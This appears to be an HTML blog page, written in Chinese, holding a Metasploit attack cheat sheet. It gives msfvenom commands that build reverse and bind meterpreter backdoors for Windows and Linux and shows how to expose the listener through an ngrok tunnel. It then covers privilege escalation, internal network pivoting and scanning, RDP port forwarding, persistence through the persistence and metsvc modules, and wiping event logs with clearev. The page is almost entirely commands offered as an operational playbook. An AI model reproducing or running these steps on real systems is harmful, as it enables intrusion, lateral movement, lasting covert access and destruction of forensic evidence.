@@ -1,0 +1,195 @@
+<!DOCTYPE HTML>
+<html>
+<head>
+  <meta charset="utf-8">
+  
+  <title>msf_meterpreter_1 | Hexo</title>
+
+  
+  <meta name="author" content="John Doe">
+  
+
+  
+  <meta name="description" content="0x01 生成远控后门(无免杀，找免杀请移步别处windows :反向连接
+&amp;gt; msfvenom -p windows/meterpreter/reverse_tcp lhost=反弹IP lport=反弹端口 -f exe -o 文件名
+
+正向连接
+&amp;gt; msfvenom -p wind">
+  
+
+  
+  
+  <meta name="keywords" content="">
+  
+
+  <meta id="viewport" name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, minimum-scale=1, user-scalable=no, minimal-ui">
+  <meta name="apple-mobile-web-app-capable" content="yes">
+  <meta name="apple-mobile-web-app-status-bar-style" content="black">
+
+  <meta property="og:title" content="msf_meterpreter_1"/>
+
+  <meta property="og:site_name" content="Hexo"/>
+
+  
+  <meta property="og:image" content="/favicon.ico"/>
+  
+
+  <link href="/favicon.ico" rel="icon">
+  <link rel="alternate" href="/atom.xml" title="Hexo" type="application/atom+xml">
+  <link rel="stylesheet" href="/css/style.css" media="screen" type="text/css">
+</head>
+
+
+<body>
+<div class="blog">
+  <div class="content">
+
+    <header>
+  <div class="site-branding">
+    <h1 class="site-title">
+      <a href="/">Hexo</a>
+    </h1>
+    <p class="site-description"></p>
+  </div>
+  <nav class="site-navigation">
+    <ul>
+      
+    </ul>
+  </nav>
+</header>
+
+    <main class="site-main posts-loop">
+    <article>
+
+  
+    
+    <h3 class="article-title"><span>msf_meterpreter_1</span></h3>
+    
+  
+
+  <div class="article-top-meta">
+    <span class="posted-on">
+      <a href="/2019/06/17/msf-meterpreter-1/" rel="bookmark">
+        <time class="entry-date published" datetime="2019-06-17T08:37:25.000Z">
+          2019-06-17
+        </time>
+      </a>
+    </span>
+  </div>
+
+
+  
+
+  <div class="article-content">
+    <div class="entry">
+      
+        <h2 id="0x01-生成远控后门-无免杀，找免杀请移步别处"><a href="#0x01-生成远控后门-无免杀，找免杀请移步别处" class="headerlink" title="0x01 生成远控后门(无免杀，找免杀请移步别处"></a><strong><em>0x01</em> 生成远控后门(无免杀，找免杀请移步别处</strong></h2><h3 id="windows"><a href="#windows" class="headerlink" title="windows :"></a><em><strong>windows :</strong></em></h3><h3 id="反向连接"><a href="#反向连接" class="headerlink" title="反向连接"></a><strong>反向连接</strong></h3><blockquote>
+<p><em><strong>&gt; msfvenom -p windows/meterpreter/reverse_tcp lhost=</strong></em><strong>反弹</strong><em><strong>IP lport=</strong></em><strong>反弹端口</strong> <em><strong>-f exe -o</strong></em> <strong>文件名</strong></p>
+</blockquote>
+<h3 id="正向连接"><a href="#正向连接" class="headerlink" title="正向连接"></a><strong>正向连接</strong></h3><blockquote>
+<p><em><strong>&gt; msfvenom -p windows/meterpreter/bind_tcp lport=</strong></em><strong>监听端口</strong> <em><strong>-f exe -o</strong></em> <strong>文件名</strong></p>
+</blockquote>
+<h3 id="linux"><a href="#linux" class="headerlink" title="linux:"></a><em><strong>linux:</strong></em></h3><h3 id="反向连接-1"><a href="#反向连接-1" class="headerlink" title="反向连接"></a><strong>反向连接</strong></h3><blockquote>
+<p><em><strong>&gt; msfvenom -p linux/x86/meterpreter/reverse_tcp lhost=</strong></em><strong>反弹</strong><em><strong>IP lport=</strong></em><strong>反弹端口</strong> <em><strong>-f elf -o</strong></em> <strong>文件名</strong></p>
+</blockquote>
+<h3 id="正向连接-1"><a href="#正向连接-1" class="headerlink" title="正向连接"></a><strong>正向连接</strong></h3><blockquote>
+<p><em><strong>&gt; msfvenom -p linux/x86/meterpreter/bind_tcp lport=</strong></em><strong>监听端口</strong> <em><strong>-f elf -o</strong></em> <strong>文件名</strong></p>
+</blockquote>
+<h2 id="0x02-映射本地-msf-到公网"><a href="#0x02-映射本地-msf-到公网" class="headerlink" title="0x02 映射本地_msf_到公网"></a><strong><em>0x02</em> 映射本地_msf_到公网</strong></h2><h3 id="解决方案很多，我用的是sunny-ngrok"><a href="#解决方案很多，我用的是sunny-ngrok" class="headerlink" title="解决方案很多，我用的是sunny ngrok"></a><strong>解决方案很多，我用的是<em><a href="https://www.ngrok.cc" target="_blank" rel="noopener">sunny ngrok</a></em></strong></h3><h3 id="使用很简单，后台创建好-tcp-隧道，本地一条命令了事"><a href="#使用很简单，后台创建好-tcp-隧道，本地一条命令了事" class="headerlink" title="使用很简单，后台创建好_tcp_隧道，本地一条命令了事"></a><strong>使用很简单，后台创建好_tcp_隧道，本地一条命令了事</strong></h3><blockquote>
+<p><em><strong>&gt; ~/Desktop# ./sunny clientid ID</strong></em></p>
+</blockquote>
+<h2 id="0x03-创建会话"><a href="#0x03-创建会话" class="headerlink" title="0x03 创建会话"></a><strong><em>0x03</em> 创建会话</strong></h2><blockquote>
+<p><em><strong>&gt; use exploit/multi/handler</strong></em> <em><strong>&gt; set payload windows/meterpreter/reverse_tcp</strong></em> <em><strong>&gt; set lhost 127.0.0.1</strong></em> <em><strong>&gt; set lport</strong></em> <strong>本机监听端口</strong> <em><strong>&gt; run</strong></em></p>
+</blockquote>
+<h2 id="0x04-获取信息"><a href="#0x04-获取信息" class="headerlink" title="0x04 获取信息"></a><strong><em>0x04</em> 获取信息</strong></h2><h3 id="查看用户"><a href="#查看用户" class="headerlink" title="查看用户"></a><strong>查看用户</strong></h3><blockquote>
+<p><em><strong>&gt; getuid</strong></em></p>
+</blockquote>
+<h3 id="查看补丁"><a href="#查看补丁" class="headerlink" title="查看补丁"></a><strong>查看补丁</strong></h3><blockquote>
+<p><em><strong>&gt; run post/windows/gather/enum_patches</strong></em></p>
+</blockquote>
+<h3 id="根据版本号可以使用相关的-exp-进行提权，也可以使用-meterpreter-自带的-getsystem-模块"><a href="#根据版本号可以使用相关的-exp-进行提权，也可以使用-meterpreter-自带的-getsystem-模块" class="headerlink" title="根据版本号可以使用相关的_exp_进行提权，也可以使用_meterpreter_自带的_getsystem_模块"></a><strong>根据版本号可以使用相关的_exp_进行提权，也可以使用_meterpreter_自带的_getsystem_模块</strong></h3><h3 id="使用shell-可以打开-cmd"><a href="#使用shell-可以打开-cmd" class="headerlink" title="使用shell_可以打开_cmd"></a><strong>使用<em>shell_可以打开_cmd</em></strong></h3><h3 id="通过查询-arp-缓存表，网卡配置等可以对内网机器进行下一步攻击"><a href="#通过查询-arp-缓存表，网卡配置等可以对内网机器进行下一步攻击" class="headerlink" title="通过查询_arp_缓存表，网卡配置等可以对内网机器进行下一步攻击"></a><strong>通过查询_arp_缓存表，网卡配置等可以对内网机器进行下一步攻击</strong></h3><blockquote>
+<p><em><strong>&gt; arp -a</strong></em><br><em><strong>&gt; ipconfig /all</strong></em></p>
+</blockquote>
+<h2 id="0x05-网络代理"><a href="#0x05-网络代理" class="headerlink" title="0x05 网络代理"></a><strong><em>0x05</em> 网络代理</strong></h2><h3 id="由得到的网卡信息，添加路由"><a href="#由得到的网卡信息，添加路由" class="headerlink" title="由得到的网卡信息，添加路由"></a><strong>由得到的网卡信息，添加路由</strong></h3><blockquote>
+<p><em><strong>&gt; run get_local_subnets</strong></em><br><em><strong>&gt; run autoroute -s x.x.x.x/x</strong></em></p>
+</blockquote>
+<h3 id="验证添加的路由"><a href="#验证添加的路由" class="headerlink" title="验证添加的路由"></a><strong>验证添加的路由</strong></h3><blockquote>
+<p><em><strong>&gt; run autoroute -p</strong></em></p>
+</blockquote>
+<h3 id="添加路由之后可以使用-meterpreter-做代理，也可以使用-socks-proxychains-的方法代理"><a href="#添加路由之后可以使用-meterpreter-做代理，也可以使用-socks-proxychains-的方法代理" class="headerlink" title="添加路由之后可以使用_meterpreter_做代理，也可以使用_socks+proxychains_的方法代理"></a><strong>添加路由之后可以使用_meterpreter_做代理，也可以使用_socks+proxychains_的方法代理</strong></h3><h3 id="meterpreter"><a href="#meterpreter" class="headerlink" title="meterpreter"></a><em><strong>meterpreter</strong></em></h3><blockquote>
+<p><em><strong>&gt; getproxy</strong></em></p>
+</blockquote>
+<h3 id="socks-proxychains"><a href="#socks-proxychains" class="headerlink" title="socks+proxychains"></a><em><strong>socks+proxychains</strong></em></h3><blockquote>
+<p><em><strong>&gt; use auxiliary/server/socks4a</strong></em><br><em><strong>&gt; proxychains xxx</strong></em></p>
+</blockquote>
+<h2 id="0x06-内网扫描"><a href="#0x06-内网扫描" class="headerlink" title="0x06 内网扫描"></a><strong><em>0x06</em> 内网扫描</strong></h2><h3 id="由于上面添加了路由，可以直接使用db-nmap-扫描，但是-pivot-只能在-msf-中用，想使用-msf-以外的脚本还得是-proxychains"><a href="#由于上面添加了路由，可以直接使用db-nmap-扫描，但是-pivot-只能在-msf-中用，想使用-msf-以外的脚本还得是-proxychains" class="headerlink" title="由于上面添加了路由，可以直接使用db_nmap_扫描，但是_pivot_只能在_msf_中用，想使用_msf_以外的脚本还得是_proxychains"></a><strong>由于上面添加了路由，可以直接使用<em>db_nmap_扫描，但是_pivot_只能在_msf_中用，想使用_msf_以外的脚本还得是_proxychains</em></strong></h3><blockquote>
+<p><em><strong>&gt; db_nmap -sV</strong></em> <strong>目标IP/划分子网</strong></p>
+</blockquote>
+<h3 id="db-nmap-还会自动将扫描结果写入数据库"><a href="#db-nmap-还会自动将扫描结果写入数据库" class="headerlink" title="_db_nmap_还会自动将扫描结果写入数据库"></a><strong>_db_nmap_还会自动将扫描结果写入数据库</strong></h3><blockquote>
+<p><em><strong>&gt; services</strong></em></p>
+</blockquote>
+<h2 id="0x07-端口转发"><a href="#0x07-端口转发" class="headerlink" title="0x07 端口转发"></a><strong><em>0x07</em> 端口转发</strong></h2><h3 id="使用-meterpreter-内置的-portfwd-，或者-lcx-Linux有portmap-等工具"><a href="#使用-meterpreter-内置的-portfwd-，或者-lcx-Linux有portmap-等工具" class="headerlink" title="使用_meterpreter_内置的_portfwd_，或者_lcx(Linux有portmap)_等工具"></a><strong>使用_meterpreter_内置的_portfwd_，或者_lcx(Linux有portmap)_等工具</strong></h3><h3 id="portfwd"><a href="#portfwd" class="headerlink" title="portfwd:"></a><em><strong>portfwd:</strong></em></h3><blockquote>
+<p><em><strong>&gt; portfwd add -l 6666 -p 3389 -r 127.0.0.1</strong></em><br><em><strong>&gt; rdesktop 127.0.0.1:6666</strong></em></p>
+</blockquote>
+<h3 id="lcx"><a href="#lcx" class="headerlink" title="lcx:"></a><em><strong>lcx:</strong></em></h3><blockquote>
+<p><strong><em>&gt; lcx.exe -listen 3333 4444</em> #监听机</strong><br><strong><em>&gt; lcx.exe -slave</em> 监听机<em>ip port 127.0.0.1 3389</em></strong></p>
+</blockquote>
+<h2 id="0x08-长期维权"><a href="#0x08-长期维权" class="headerlink" title="0x08 长期维权"></a><strong><em>0x08</em> 长期维权</strong></h2><h3 id="meterpreter-会话不适合长期维持权限，但是可以使用它内置的-persistentce-模块写入，或者-metmvc-创建服务"><a href="#meterpreter-会话不适合长期维持权限，但是可以使用它内置的-persistentce-模块写入，或者-metmvc-创建服务" class="headerlink" title="_meterpreter_会话不适合长期维持权限，但是可以使用它内置的_persistentce_模块写入，或者_metmvc_创建服务"></a><strong>_meterpreter_会话不适合长期维持权限，但是可以使用它内置的_persistentce_模块写入，或者_metmvc_创建服务</strong></h3><h3 id="persistence"><a href="#persistence" class="headerlink" title="persistence:"></a><em><strong>persistence:</strong></em></h3><blockquote>
+<p><strong><em>&gt; run persistence -X -i 10 -p</em> 端口 <em>-r</em> 反向连接<em>IP</em></strong></p>
+</blockquote>
+<h3 id="metmvc"><a href="#metmvc" class="headerlink" title="metmvc:"></a><em><strong>metmvc:</strong></em></h3><blockquote>
+<p><em><strong>&gt; run metsvc -A</strong></em></p>
+</blockquote>
+<h2 id="0x09-脚底抹油"><a href="#0x09-脚底抹油" class="headerlink" title="0x09 脚底抹油"></a><strong>0x09 脚底抹油</strong></h2><blockquote>
+<p><em><strong>&gt; clearev</strong></em></p>
+</blockquote>
+
+      
+    </div>
+
+  </div>
+
+  <div class="article-footer">
+    <div class="article-meta pull-left">
+
+    
+      
+
+    <span class="post-categories">
+      <i class="icon-categories"></i>
+        <a href="/categories/笔记/">笔记</a>
+    </span>
+    
+
+    
+
+    </div>
+
+    
+  </div>
+</article>
+
+  
+
+
+
+
+
+
+    </main>
+
+    <footer class="site-footer">
+  <p class="site-info">
+    Proudly powered by <a href="https://hexo.io/" target="_blank">Hexo</a> and
+    Theme by <a href="https://github.com/CodeDaraW/Hacker" target="_blank">Hacker</a>
+    </br>
+    
+    &copy; 2019 John Doe
+    
+  </p>
+</footer>
+    
+  </div>
+</div>
+</body>
+</html>
